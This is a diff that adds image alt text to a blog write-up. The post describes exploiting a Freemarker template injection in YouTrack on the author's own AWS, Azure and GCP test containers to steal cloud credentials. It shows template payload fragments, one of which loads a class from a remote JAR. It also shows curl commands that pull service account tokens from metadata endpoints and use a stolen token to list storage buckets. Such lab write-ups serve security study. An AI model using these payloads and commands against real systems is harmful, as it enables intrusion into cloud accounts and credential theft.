@@ -50,11 +50,11 @@ The core of the issue was the usage of a misconfigured version of the [Freemarke
 
 To make the story short, the vulnerability was present in the YouTrack functionality that allowed the creation of notification templates. The image below shows how the execution occurs: 
 
-<p align="center"> <img src="/assets/images/SSTI.png"> </p>
+<p align="center"> <img src="/assets/images/SSTI.png" alt="SSTI in YouTrack notification template"> </p>
 
 Now, most template engines have protections to ensure that some instructions cannot be run (e.g., instructions that may allow attackers to execute arbitrary code). However, by using a sandbox bypass (thoroughly explained in [this Synacktiv blog post](https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html)), it is possible to run arbitrary instructions on the YouTrack server: 
 
-<p align="center"> <img src="/assets/images/SSTI2.png"> </p>
+<p align="center"> <img src="/assets/images/SSTI2.png" alt="Freemarker sandbox bypass chain using ProtectionDomain and ClassLoader"> </p>
 
 The template injection bypasses Freemarker's sandboxing by using an object of the `ProtectionDomain` class, which can instantiate a `ClassLoader` object. After this, it is possible to use the class loader object to instantiate an object of the `Execute` class, which can be used to execute arbitrary commands in the server. For an in-depth overview of this bypass, see [this](https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Alvaro%20Mun%CC%83oz%20and%20Oleksandr%20Mirosh%20-%20Room%20For%20Escape%20Scribbling%20Outside%20The%20Lines%20Of%20Template%20Security.pdf) Defcon presentation and [this](https://ackcent.com/in-depth-freemarker-template-injection/) blog post by Ackcent.
 
@@ -67,7 +67,7 @@ In AWS, EC2 instances can use an Instance Metadata Service (IMDSv1 or IMDSv2) to
 
 In general terms, the Elastic Container Service (ECS) from allow the usage of Fargate and the Elastic Kubernetes Service (EKS) to deploy containerized applications. On Fargate, *task defnitions* are used to describe one containers that form the different applications, while *tasks* are instances of task definitions that are run in the Fargate cluster (see [here](https://docs.aws.amazon.com/AmazonECS/latest/userguide/what-is-fargate.html) for the in-depth AWS explanation). Below, I show the Fargate cluster I deployed with the vulnerable version of YouTrack. 
 
-<p align="center"> <img src="/assets/images/Fargate.png"> </p>
+<p align="center"> <img src="/assets/images/Fargate.png" alt="Fargate cluster running the vulnerable YouTrack container"> </p>
 
 
 As with EC2 instances, Fargate's tasks are assigned a [metadata endpoint](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint.html) that can be used to retrieve useful information from the containers in the task. Moreover, similarly to the IMDS from EC2, whenever the tasks are assigned a given IAM role, credentials can be retrieved from the task metadata endpoint. 
@@ -92,7 +92,7 @@ ${dwf.newInstance(ec,null)("printenv")}
 
 I have only changed the executed command to `printenv`, which allow us to print the environment variables. Note that this is also possible, as the container YouTrack container runs by root as default, so I have access to all environment variables. This is the result: 
 
-<p align="center"> <img src="/assets/images/Hack1.png"> </p>
+<p align="center"> <img src="/assets/images/Hack1.png" alt="printenv output exposing AWS environment variables inside the container"> </p>
 
 The first thing to notice is all the AWS information (e.g., region, default region, etc). This tells us that I am in an AWS cloud, and that this is an ECS container. From this, it is clear that I am after the `$AWS_CONTAINER_RELATIVE_URI` environment variable. Having this, I can then do a simple cURL request: 
 
@@ -101,7 +101,7 @@ The first thing to notice is all the AWS information (e.g., region, default regi
 to obtain the credentials. Keep in mind that the IP of the metadata endpoint is always `169.254.170.2` and that it is also shown in the environment variable `ECS_CONTAINER_METADATA_URI`. Do note that some containers may not have cURL or wget installed, so additional steps may be required. 
 
 
-<p align="center"> <img src="/assets/images/Hack2.png"> </p>
+<p align="center"> <img src="/assets/images/Hack2.png" alt="cURL response containing temporary IAM role credentials from the Fargate task metadata endpoint"> </p>
 
 
 As you can see in the image above, I have obtained the `AccessKeyId`, the `SecretAccessKey` and also the `Token` (although it is not shown in the screenshot). These elements are enough to use the AWS CLI. Notice that the key id is prefixed by ASIA, which means it is a temporary access key (this is the reason why the token is required).
@@ -187,11 +187,11 @@ ${dwf.newInstance(curl,null).getMetadataCredentialsARM()}
 
 Above, the payload first creates an object from the `classLoader` class from `ProtectionDomain`. Then, a list of class URLs is obtained and a tampered list is created by adding the URL to the JAR file which is in a blob storage. I then create a new `classLoader` using the tampered URL list and proceed to load the `JavaCurl` class which will then be used to call the `getMetadataCredentialsARM()` function. The result of this: 
 
-<p align="center"> <img src="/assets/images/Hack3.png"> </p>
+<p align="center"> <img src="/assets/images/Hack3.png" alt="Azure managed identity access token returned by the instance metadata endpoint"> </p>
 
 I have obtained the access token from the managed identity of the application in the container. Next, I can decode this access token to obtain the `appid`, which is the managed identity id, used to login via the Azure CLI/Azure powershell module. 
 
-<p align="center"> <img src="/assets/images/Hack4.png"> </p>
+<p align="center"> <img src="/assets/images/Hack4.png" alt="Decoded JWT payload showing the managed identity appid claim"> </p>
 
 **Note:** Decoding can be done using `jq` command: 
 
@@ -202,7 +202,7 @@ jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "$JWT"
 Having obtained the managed identity id and the token, I can then finally log in via the CLI or PowerShell:
 
 
-<p align="center"> <img src="/assets/images/Hack5.png"> </p>
+<p align="center"> <img src="/assets/images/Hack5.png" alt="Successful Azure CLI login using the captured managed identity access token"> </p>
 
 For this exercise I have not assigned any roles or permissions to the application. That is why the `SubscriptionName` is empty. Do take into account that even if no subscription has been assigned, the application may have permissions within Azure Active Directory.
 
@@ -227,7 +227,7 @@ Assume that I have compromised a Cloud Run container and found a way to execute 
 ```
 curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" --header "Metadata-Flavor: Google"
 ```
-<p align="center"> <img src="/assets/images/Hack6.png"> </p>
+<p align="center"> <img src="/assets/images/Hack6.png" alt="Default service account email retrieved from the Cloud Run metadata endpoint"> </p>
 
 Notice that from the [documentation](https://cloud.google.com/compute/docs/access/service-accounts#default_service_account), I know that all default service accounts are associated to an email of the form:
 
@@ -241,7 +241,7 @@ So the account seen above seems to be a default service account. The next step i
 curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" --header "Metadata-Flavor: Google"
 ```
 
-<p align="center"> <img src="/assets/images/Hack7.png"> </p>
+<p align="center"> <img src="/assets/images/Hack7.png" alt="GCP project ID returned by the Cloud Run metadata endpoint"> </p>
 
 which allow us to find the project id: `gcp-container-tests`
 
@@ -250,7 +250,7 @@ Before I can start enumerating any resources within this project, however, I sti
 ```
 curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --header "Metadata-Flavor: Google"
 ```
-<p align="center"> <img src="/assets/images/Hack8.png"> </p>
+<p align="center"> <img src="/assets/images/Hack8.png" alt="OAuth access token returned by the Cloud Run service account metadata endpoint"> </p>
 
 Having the previous information I can finally start querying the Google Cloud APIs to enumerate different resources within the project. As an illustration, let us list all the buckets: 
 
@@ -258,7 +258,7 @@ Having the previous information I can finally start querying the Google Cloud AP
 curl -X GET -H "Authorization: Bearer $TOKEN"  "https://storage.googleapis.com/storage/v1/b?project=gcp-container-tests"
 ```
 
-<p align="center"> <img src="/assets/images/Hack9.png"> </p>
+<p align="center"> <img src="/assets/images/Hack9.png" alt="GCS bucket listing retrieved with the compromised service account token"> </p>
 
 which shows us the current buckets within the account. For a more in-depth explanation on how to interact with the different Google Cloud APIs, see the [documentation](https://cloud.google.com/apis#section-3).
 
